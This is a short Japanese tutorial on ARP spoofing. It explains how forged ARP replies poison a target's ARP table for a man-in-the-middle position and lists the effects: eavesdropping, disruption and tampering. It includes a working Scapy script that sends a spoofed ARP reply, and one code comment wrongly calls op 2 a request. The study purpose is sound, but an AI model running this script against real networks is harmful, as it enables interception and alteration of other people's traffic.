### ArpSpoofingについて

#### おさらい
ARPはイーサネットにおいてIPアドレスからMACアドレスを取得するためのプロトコル。逆はRARP。

IPアドレス宛にパケットを送信したい場合に、IPアドレスと機器を紐づけるためにARP要求をブロードキャストで発信し、対応する機器がユニキャストで答えることでIPアドレスと機器が結び付く。

<span style="font-size: 80%">
イーサネット：ここではローカルエリアネットワーク(LAN)</span>

#### ARP Spoofingとは
中間者攻撃で用いられる方法の一種。同一ネットワーク上で攻撃対象のマシンとルータの間に割り込む方法。  

対象のARPテーブルを書き換えるために、攻撃者がルータのIPアドレスと自身のMACアドレスを使用したパケットを対象に送信することで、対象は攻撃者のマシンをルータだと誤認する。  

MACアドレスを書き換える攻撃なので同一ネットワーク上で成立する。

#### 問題点
* プロトコルがUDP / ステートレス
* 本人の確認が出来ない

#### 影響
* 通信の盗聴
* 通信の妨害
* 通信の改ざん

#### コーディング
簡単なパケットを作成して送信するのにすごく便利なpythonで書くことにする。

```python
from scapy.all import *
import sys

target_ip = sys.argv[1] # 送信先IPアドレス
target_mac = sys.argv[2] # 送信先MACアドレス
source_ip = sys.argv[3] # 送信元IPアドレス

# ARP要求パケット作成
frame = Ether(dst=target_mac)/ARP()
frame.op = 2 # 1 ARP要求 / 2 ARPリクエスト
frame.psrc = source_ip # 送信元
frame.pdst = target_ip # 送信先

# 送信
sendp(frame)
```

<s>実環境で使用する場合は継続的にパケットを送信しないと正しい組み合わせに戻ってしまうので注意が必要</s>

#### 参考にしたサイト
* [https://qiita.com/warito2323/items/bd3327073c0ca9205797]  
* [https://qiita.com/ryoma30/items/298c219addbb96e150e1]  
* [https://ja.wikipedia.org/wiki/ARP%E3%82%B9%E3%83%97%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%B0]  
* [https://scapy.readthedocs.io/en/latest/]  

